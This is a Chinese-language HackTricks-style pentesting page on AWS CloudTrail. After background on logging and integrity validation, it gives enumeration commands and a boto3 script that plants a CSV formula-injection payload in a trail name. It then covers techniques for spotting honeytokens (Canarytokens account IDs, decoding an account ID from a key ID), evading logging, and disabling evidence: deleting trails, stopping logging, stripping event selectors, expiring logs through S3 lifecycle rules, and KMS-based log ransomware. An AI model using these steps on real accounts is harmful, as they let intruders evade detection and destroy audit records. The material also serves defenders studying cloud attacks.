# AWS - CloudTrail Enum

{{#include ../../../../banners/hacktricks-training.md}}

## **CloudTrail**

AWS CloudTrail **记录和监控您 AWS 环境中的活动**。它捕获详细的 **事件日志**，包括谁在何时、从何处进行了什么操作，针对所有与 AWS 资源的交互。这提供了更改和操作的审计跟踪，有助于安全分析、合规审计和资源更改跟踪。CloudTrail 对于理解用户和资源行为、增强安全态势以及确保合规性至关重要。

每个记录的事件包含：

- 被调用的 API 名称： `eventName`
- 被调用的服务： `eventSource`
- 时间： `eventTime`
- IP 地址： `SourceIPAddress`
- 代理方法： `userAgent`。示例：
- Signing.amazonaws.com - 来自 AWS 管理控制台
- console.amazonaws.com - 账户的根用户
- lambda.amazonaws.com - AWS Lambda
- 请求参数： `requestParameters`
- 响应元素： `responseElements`

事件每 **大约 5 分钟写入一个新的日志文件，格式为 JSON**，它们由 CloudTrail 保存，最后，日志文件 **大约在 15 分钟后交付到 S3**。\
CloudTrail 的日志可以 **跨账户和跨区域聚合。**\
CloudTrail 允许使用 **日志文件完整性，以便能够验证您的日志文件自 CloudTrail 交付给您以来是否保持不变**。它在摘要文件中创建日志的 SHA-256 哈希。每小时创建新日志的 SHA-256 哈希。\
创建 Trail 时，事件选择器将允许您指示要记录的 Trail：管理、数据或洞察事件。

日志保存在 S3 存储桶中。默认情况下使用服务器端加密（SSE-S3），因此 AWS 将为有权访问的人解密内容，但为了额外的安全性，您可以使用 SSE 和 KMS 及您自己的密钥。

日志存储在 **具有此名称格式的 S3 存储桶中**：

- **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
- 存储桶名称为： **`aws-cloudtrail-logs-<accountid>-<random>`**
- 示例： **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

在每个文件夹中，每个日志将具有 **遵循此格式的名称**： **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

日志文件命名约定

![](<../../../../images/image (122).png>)

此外，**摘要文件（用于检查文件完整性）**将位于 **同一存储桶**中：

![](<../../../../images/image (195).png>)

### 从多个账户聚合日志

- 在您希望日志文件交付到的 AWS 账户中创建一个 Trail
- 对目标 S3 存储桶应用权限，允许 CloudTrail 的跨账户访问，并允许每个需要访问的 AWS 账户
- 在其他 AWS 账户中创建一个新 Trail，并选择使用步骤 1 中创建的存储桶

然而，即使您可以将所有日志保存在同一个 S3 存储桶中，您也无法将来自多个账户的 CloudTrail 日志聚合到属于单个 AWS 账户的 CloudWatch Logs 中。

> [!CAUTION]
> 请记住，一个账户可以有 **不同的 Trails** 从 CloudTrail **启用**，在不同的存储桶中存储相同（或不同）的日志。

### 从所有组织账户到 1 个 CloudTrail

创建 CloudTrail 时，可以指示为组织中的所有账户激活 CloudTrail，并将日志集中到一个存储桶中：

<figure><img src="../../../../images/image (200).png" alt=""><figcaption></figcaption></figure>

这样，您可以轻松地在所有账户的所有区域配置 CloudTrail，并将日志集中在一个账户中（您应该保护该账户）。

### 日志文件检查

您可以通过运行
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### 日志到 CloudWatch

**CloudTrail 可以自动将日志发送到 CloudWatch，以便您可以设置警报，当执行可疑活动时提醒您。**\
请注意，为了允许 CloudTrail 将日志发送到 CloudWatch，需要创建一个允许该操作的 **角色**。如果可能，建议使用 AWS 默认角色来执行这些操作。此角色将允许 CloudTrail：

- CreateLogStream: 这允许创建 CloudWatch Logs 日志流
- PutLogEvents: 将 CloudTrail 日志传送到 CloudWatch Logs 日志流

### 事件历史

CloudTrail 事件历史允许您在表格中检查已记录的日志：

![](<../../../../images/image (89).png>)

### 洞察

**CloudTrail 洞察** 自动 **分析** CloudTrail 路径中的写管理事件，并 **提醒** 您 **异常活动**。例如，如果 `TerminateInstance` 事件的增加与既定基线不同，您将看到它作为洞察事件。这些事件使 **发现和响应异常 API 活动比以往任何时候都更容易**。

洞察存储在与 CloudTrail 日志相同的存储桶中：`BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### 安全

| CloudTrail 日志文件完整性        | <ul><li>验证日志是否被篡改（修改或删除）</li><li><p>使用摘要文件（为每个文件创建哈希）</p><ul><li>SHA-256 哈希</li><li>使用 RSA 进行数字签名的 SHA-256</li><li>由 Amazon 拥有的私钥</li></ul></li><li>创建摘要文件需要 1 小时（每小时整点完成）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 防止未经授权的访问             | <ul><li><p>使用 IAM 策略和 S3 存储桶策略</p><ul><li>安全团队 —> 管理员访问</li><li>审计员 —> 只读访问</li></ul></li><li>使用 SSE-S3/SSE-KMS 加密日志</li></ul>                                                                                                                                        |
| 防止日志文件被删除 | <ul><li>使用 IAM 和存储桶策略限制删除访问</li><li>配置 S3 MFA 删除</li><li>使用日志文件验证进行验证</li></ul>                                                                                                                                                                                            |

## 访问顾问

AWS 访问顾问依赖于过去 400 天的 AWS **CloudTrail 日志来收集其洞察**。CloudTrail 捕获在 AWS 账户中进行的 AWS API 调用和相关事件的历史记录。访问顾问利用这些数据 **显示服务最后一次访问的时间**。通过分析 CloudTrail 日志，访问顾问可以确定 IAM 用户或角色访问了哪些 AWS 服务以及何时发生该访问。这帮助 AWS 管理员做出有关 **精炼权限** 的明智决策，因为他们可以识别长时间未被访问的服务，并可能根据实际使用模式减少过于宽泛的权限。

> [!TIP]
> 因此，访问顾问告知 **给予用户的不必要权限**，以便管理员可以删除它们

<figure><img src="../../../../images/image (78).png" alt=""><figcaption></figcaption></figure>

## 操作

### 枚举
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV 注入**

在 CloudTrail 中执行 CVS 注入是可能的，如果日志以 CSV 格式导出并在 Excel 中打开，将执行任意代码。\
以下代码将生成一个包含有效负载的坏 Trail 名称的日志条目：
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
有关 CSV 注入的更多信息，请查看页面：

{{#ref}}
https://book.hacktricks.xyz/pentesting-web/formula-injection
{{#endref}}

有关此特定技术的更多信息，请查看 [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **绕过检测**

### HoneyTokens **绕过**

HoneyTokens 的创建是为了 **检测敏感信息的外泄**。在 AWS 的情况下，它们是 **使用受到监控的 AWS 密钥**，如果某个操作触发了该密钥的动作，那么就必须有人窃取了该密钥。

然而，像 [**Canarytokens**](https://canarytokens.org/generate)**、** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new&status=open)**、** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) 创建的 HoneyTokens 要么使用可识别的账户名称，要么为所有客户使用相同的 AWS 账户 ID。因此，如果您可以在不让 Cloudtrail 创建任何日志的情况下获取账户名称和/或账户 ID，**您就可以知道该密钥是否是 HoneyToken**。

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam__detect_honeytokens/main.py#L57) 有一些规则来检测密钥是否属于 [**Canarytokens**](https://canarytokens.org/generate)**、** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new&status=open)**、** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

- 如果 **`canarytokens.org`** 出现在角色名称中，或者账户 ID **`534261010715`** 出现在错误消息中。
- 最近测试时，他们使用的账户是 **`717712589309`**，并且名称中仍然包含 **`canarytokens.com`** 字符串。
- 如果 **`SpaceCrab`** 出现在错误消息中的角色名称中
- **SpaceSiren** 使用 **uuids** 生成用户名：`[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
- 如果 **名称看起来像是随机生成的**，那么它是 HoneyToken 的概率很高。

#### 从密钥 ID 获取账户 ID

您可以从 **访问密钥** 中的 **编码** 获取 **账户 ID**，如 [**此处所述**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)，并使用您的 HoneyTokens AWS 账户列表检查账户 ID：
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
检查更多信息请访问[**原始研究**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)。

#### 不生成日志

最有效的技术实际上是一个简单的方法。只需使用您刚找到的密钥访问您自己攻击者账户中的某个服务。这将使**CloudTrail在您自己的AWS账户中生成日志，而不是在受害者账户中**。

问题在于，输出将显示一个错误，指示账户ID和账户名称，因此**您将能够看到它是否是一个Honeytoken**。

#### 没有日志的AWS服务

过去有一些**AWS服务不会将日志发送到CloudTrail**（在这里找到[列表](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。其中一些服务将**响应**一个**错误**，其中包含**密钥角色的ARN**，如果有人未经授权（即Honeytoken密钥）尝试访问它。

通过这种方式，**攻击者可以在不触发任何日志的情况下获取密钥的ARN**。在ARN中，攻击者可以看到**AWS账户ID和名称**，很容易知道HoneyToken的公司账户ID和名称，因此攻击者可以识别该令牌是否是HoneyToken。

![](<../../../../images/image (93).png>)

> [!CAUTION]
> 请注意，所有被发现不创建CloudTrail日志的公共API现在已修复，因此您可能需要自己寻找...
>
> 有关更多信息，请查看[**原始研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)。

### 访问第三方基础设施

某些AWS服务将**生成一些基础设施**，例如**数据库**或**Kubernetes**集群（EKS）。用户**直接与这些服务交互**（如Kubernetes API）**不会使用AWS API**，因此CloudTrail将无法看到此通信。

因此，具有EKS访问权限的用户如果发现EKS API的URL，可以在本地生成一个令牌，并**直接与API服务交谈而不被Cloudtrail检测到**。

更多信息请参见：

{{#ref}}
../../aws-post-exploitation/aws-eks-post-exploitation.md
{{#endref}}

### 修改CloudTrail配置

#### 删除轨迹
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### 停止跟踪
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### 禁用多区域日志记录
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### 通过事件选择器禁用日志记录
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
在第一个示例中，提供了一个包含单个对象的 JSON 数组作为事件选择器。`"ReadWriteType": "ReadOnly"` 表示 **事件选择器仅应捕获只读事件**（因此 CloudTrail insights **不会检查写入** 事件，例如）。

您可以根据您的具体要求自定义事件选择器。

#### 通过 S3 生命周期策略删除日志
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
### 修改桶配置

- 删除 S3 桶
- 更改桶策略以拒绝来自 CloudTrail 服务的任何写入
- 向 S3 桶添加生命周期策略以删除对象
- 禁用用于加密 CloudTrail 日志的 kms 密钥

### Cloudtrail 勒索软件

#### S3 勒索软件

您可以 **生成一个非对称密钥** 并使 **CloudTrail 使用该密钥加密数据**，然后 **删除私钥**，以便 CloudTrail 内容无法恢复。\
这基本上是 **S3-KMS 勒索软件**，详见：

{{#ref}}
../../aws-post-exploitation/aws-s3-post-exploitation.md
{{#endref}}

**KMS 勒索软件**

这是以不同权限要求执行前述攻击的最简单方法：

{{#ref}}
../../aws-post-exploitation/aws-kms-post-exploitation.md
{{#endref}}

## **参考文献**

- [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{{#include ../../../../banners/hacktricks-training.md}}
